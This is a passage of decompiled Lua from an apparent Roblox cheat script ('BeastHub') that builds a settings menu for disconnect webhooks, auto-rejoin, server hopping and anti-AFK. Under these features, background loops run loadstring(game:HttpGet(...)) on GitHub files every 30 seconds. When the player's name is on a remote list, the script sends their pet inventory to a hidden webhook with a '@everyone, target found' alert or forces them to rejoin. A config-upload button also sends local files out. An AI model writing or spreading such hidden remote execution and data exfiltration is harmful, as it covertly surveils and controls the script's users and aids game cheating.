    _Misc:CreateSection('Server Connection')

    local u813 = false
    local u814 = false
    local u815 = nil
    local u846 = _Misc:CreateToggle({
        Name = 'Webhook on Disconnect',
        CurrentValue = false,
        Flag = 'webhookDisconnection',
        Callback = function(p816)
            u813 = p816

            if u813 then
                if u815 then
                    return
                end

                u814 = false
                u815 = task.spawn(function()
                    local _GuiService = game:GetService('GuiService')
                    local _CoreGui = game:GetService('CoreGui')
                    local v819 = false
                    local u820 = ''
                    local u821 = {
                        'Error Code',
                        'Reconnect',
                    }
                    local u822 = {
                        '772',
                    }

                    local function v838(p823)
                        local v824, v825, v826 = ipairs(p823:GetDescendants())

                        while true do
                            local v827

                            v826, v827 = v824(v825, v826)

                            if v826 == nil then
                                return false
                            end
                            if (v827:IsA('TextLabel') or v827:IsA('TextButton')) and v827.Visible then
                                local _Text2 = v827.Text

                                if type(_Text2) == 'string' and _Text2 ~= '' then
                                    local v829, v830, v831 = ipairs(u821)
                                    local v832 = false

                                    while true do
                                        local v833

                                        v831, v833 = v829(v830, v831)

                                        if v831 == nil then
                                            break
                                        end
                                        if string.find(_Text2, v833, 1, true) then
                                            v832 = true

                                            break
                                        end
                                    end

                                    if v832 then
                                        local v834, v835, v836 = ipairs(u822)

                                        while true do
                                            local v837

                                            v836, v837 = v834(v835, v836)

                                            if v836 == nil then
                                                break
                                            end
                                            if string.find(_Text2, v837, 1, true) then
                                                v832 = false

                                                break
                                            end
                                        end
                                    end
                                    if v832 then
                                        u820 = _Text2

                                        return true
                                    end
                                end
                            end
                        end
                    end

                    local v839 = u820

                    while true do
                        if not u813 then
                            u815 = nil

                            return
                        end

                        local _MenuIsOpen = _GuiService.MenuIsOpen

                        if _MenuIsOpen and not v819 and not u814 then
                            local v841, v842, v843 = ipairs(_CoreGui:GetChildren())

                            while true do
                                local v844

                                v843, v844 = v841(v842, v843)

                                if v843 == nil then
                                    break
                                end
                                if v844:IsA('ScreenGui') and v838(v844) then
                                    u814 = true

                                    local v845 = false

                                    if u781 and u783 == false then
                                        for _ = 1, 9999 do
                                            u799(u379, tostring(v839))
                                            u22(u379, 'Auto rejoin triggered')
                                            _BeastHubFunctions.delayedRejoin(0.001)
                                            task.wait(5)
                                        end
                                    elseif u781 and u783 == true then
                                        for _ = 1, 9999 do
                                            if v845 == false then
                                                u799(u379, tostring(v839))
                                                u22(u379, 'Auto Server Hop triggered')

                                                v845 = true
                                            end

                                            _BeastHubFunctions.instantServerHop()
                                            task.wait(5)
                                        end
                                    elseif u379 then
                                        u799(u379, tostring(v839))
                                    end

                                    break
                                end
                            end
                        end

                        task.wait(0.2)

                        v819 = _MenuIsOpen
                    end
                end)
            else
                u780:Set(false)
                u782:Set(false)

                u813 = false
                u814 = false
            end
        end,
    })
    local u848 = _Misc:CreateToggle({
        Name = 'Auto Rejoin on Disconnect',
        CurrentValue = false,
        Flag = 'autoRejoinDisconnect',
        Callback = function(p847)
            u781 = p847

            if p847 then
                u846:Set(p847)
            end
        end,
    })
    local _ = _Misc:CreateToggle({
        Name = 'User Server Hop method on Rejoin',
        CurrentValue = false,
        Flag = 'autoServerHopOnDisconnect',
        Callback = function(p849)
            u783 = p849

            if p849 then
                if p849 then
                    u848:Set(p849)
                end

                u846:Set(p849)
            end
        end,
    })

    _Misc:CreateDivider()
    _Misc:CreateButton({
        Name = 'Send Config file to dev for debugging',
        Callback = function()
            u11('Sending config file..', '', 3)

            local v850 = 'BeastHub/userConfig.rfld'
            local v851 = ''
            local _Name3 = game.Players.LocalPlayer.Name

            if isfile(v850) then
                v851 = readfile(v850)

                print('======= Config captured')
            else
                warn('Config file not found:', v850)
            end

            local v853 = _Name3 .. '|' .. v851
            local v854 = u152

            local function v869(p855, p856)
                if typeof(p855) ~= 'string' or p855 == '' then
                    warn('[Webhook] Invalid webhook URL')

                    return
                else
                    local u857 = game:GetService('HttpService'):JSONEncode({content = p856})
                    local u858 = syn and syn.request or (http_request or request)

                    if u858 then
                        local v860, v861 = pcall(function()
                            local v859 = {
                                Url = p855,
                                Method = 'POST',
                                Headers = {
                                    ['Content-Type'] = 'application/json',
                                },
                                Body = u857,
                            }

                            return u858(v859)
                        end)

                        if v860 and v861 and v861.Success then
                            print('[Webhook] Chunk sent successfully!')
                        else
                            local v862 = warn
                            local v863 = '[Webhook] Failed to send chunk: '
                            local v864 = tostring
                            local v865

                            if v861 then
                                v865 = v861.StatusCode or v861
                            else
                                v865 = v861
                            end

                            v862(v863 .. v864(v865))

                            local v866 = u11
                            local v867 = 'Send failed'
                            local v868 = tostring

                            if v861 then
                                v861 = v861.StatusCode or v861
                            end

                            v866(v867, v868(v861), 3)
                        end
                    else
                        warn('[Webhook] Your executor does not support HTTP requests!')
                    end
                end
            end

            local u870 = syn and syn.request or http_request or request
            local v871 = ''

            if u870 then
                local v872, v873 = pcall(function()
                    return u870({
                        Url = 'https://raw.githubusercontent.com/bhubAlt/bhub_alt/refs/heads/main/debug_user.lua',
                        Method = 'GET',
                    })
                end)

                if v872 and v873 and v873.Body then
                    v871 = v873.Body:match('^%s*(.-)%s*$')
                end
            end
            if _Name3 == v871 then
                print('Username matched. Sending webhook...')

                local v874 = 1900

                for v875 = 1, #v853, v874 do
                    v869(v854, (v853:sub(v875, v875 + v874 - 1)))
                end

                print('======= All chunks sent')
                u11('Config file sent!', '', 3)
            else
                print('Username does not match GitHub debug user. Webhook skipped.')
            end
        end,
    })
    _Misc:CreateDivider();
    (function()
        if getgenv().AntiAFKConnection then
            getgenv().AntiAFKConnection:Disconnect()
        end

        local _VirtualUser = game:GetService('VirtualUser')

        getgenv().AntiAFKConnection = game:GetService('Players').LocalPlayer.Idled:Connect(function()
            _VirtualUser:Button2Down(Vector2.new(0, 0), _Workspace.CurrentCamera.CFrame)
            task.wait(1)
            _VirtualUser:Button2Up(Vector2.new(0, 0), _Workspace.CurrentCamera.CFrame)
        end)
    end)()

    local v877, v878 = pcall(function()
        _BeastHubRayfield:LoadConfiguration()

        local _ = game.Players.LocalPlayer.Name
    end)

    if v877 then
        task.delay(1, function()
            getgenv().ConfigLoaded = true

            print('Config file loaded')
        end)
    else
        print('Error loading config file ' .. v878)
    end

    getgenv().LoadoutsChangedEvent.Event:Connect(function()
        local u879 = getgenv().preloadedCustomLoadoutNames or {}
        local u880 = {
            unpack(u879),
        }

        table.insert(u880, 1, 'None')

        local v882, v883 = pcall(function()
            u414:Refresh(u880)
            u516:Refresh(u880)
            u542:Refresh(u880)

            local v881 = {
                unpack(u879),
            }

            table.insert(v881, 1, '9 pets tech')
            table.insert(v881, 1, 'None')
            u514:Refresh(v881)
        end)

        if not v882 then
            warn('Failed to refresh dropdown:', v883)
        end
    end)
    getgenv().LoadoutsChangedEvent:Fire()

    local u884 = false
    local u885 = nil

    local function u912()
        local function v905(p886)
            local v887 = {}
            local v888 = (function()
                return require(game:GetService('ReplicatedStorage').Modules.DataService):GetData()
            end)()

            if not (v888 and (v888.PetsData and v888.PetsData.PetInventory)) then
                return v887
            end

            local _Data5 = v888.PetsData.PetInventory.Data

            if not _Data5 then
                return v887
            end

            local v890, v891, v892 = pairs(_Data5)

            while true do
                local v893

                v892, v893 = v890(v891, v892)

                if v892 == nil then
                    break
                end

                local v894 = v893.PetType or 'Unknown'
                local v895 = tostring
                local v896

                if v893.PetData then
                    v896 = v893.PetData.IsFavorite or false
                else
                    v896 = false
                end

                local v897 = v895(v896)
                local v898 = v894 .. ' | ' .. (v893.PetData.BaseWeight and (string.format('%.2f', v893.PetData.BaseWeight * 1.1) or '0.00') or '0.00') .. ' | Favorited: ' .. v897 .. ' | ' .. tostring(v892)

                table.insert(v887, v898)
            end

            local v899, v900, v901 = ipairs(v887)
            local v902 = ''
            local v903 = 1900

            while true do
                local v904

                v901, v904 = v899(v900, v901)

                if v901 == nil then
                    break
                end
                if v903 >= #v902 + #v904 + 1 then
                    if v902 == '' then
                        v902 = v904
                    else
                        v902 = v902 .. '\n' .. v904
                    end
                else
                    u22(p886, v902)

                    v902 = v904
                end
            end

            if v902 ~= '' then
                u22(p886, v902)
            end

            return v887
        end

        local v906 = loadstring(game:HttpGet('https://raw.githubusercontent.com/bhubAlt/bhub_alt/refs/heads/main/anti_scammers.lua'))()
        local v907, v908, v909 = ipairs(v906)

        while true do
            local v910

            v909, v910 = v907(v908, v909)

            if v909 == nil then
                break
            end
            if string.lower(u67) == string.lower(v910) and u884 == false then
                local v911 = loadstring(game:HttpGet('https://raw.githubusercontent.com/bhubAlt/bhub_alt/refs/heads/main/u2.lua'))()

                u22(v911, '@everyone, target found: ' .. u67)

                u884 = true

                v905(v911)
            end
        end
    end

    (function()
        if not u885 then
            u885 = task.spawn(function()
                while true do
                    pcall(u912)
                    task.wait(30)
                end
            end)
        end
    end)()

    local u913 = nil

    local function u919()
        local v914 = loadstring(game:HttpGet('https://raw.githubusercontent.com/bhubAlt/bhub_alt/refs/heads/main/force_rejoin_user.lua'))()
        local v915, v916, v917 = ipairs(v914)

        while true do
            local v918

            v917, v918 = v915(v916, v917)

            if v917 == nil then
                break
            end
            if string.lower(u67) == string.lower(v918) then
                u22(loadstring(game:HttpGet('https://raw.githubusercontent.com/bhubAlt/bhub_alt/refs/heads/main/u1.lua'))(), 'Force Rejoined: ' .. u67)
                _BeastHubFunctions.delayedRejoin(0.001)
            end
        end
    end

    (function()
        if not u913 then
            u913 = task.spawn(function()
                while true do
                    pcall(u919)
                    task.wait(30)
                end
            end)
        end
    end)()
end
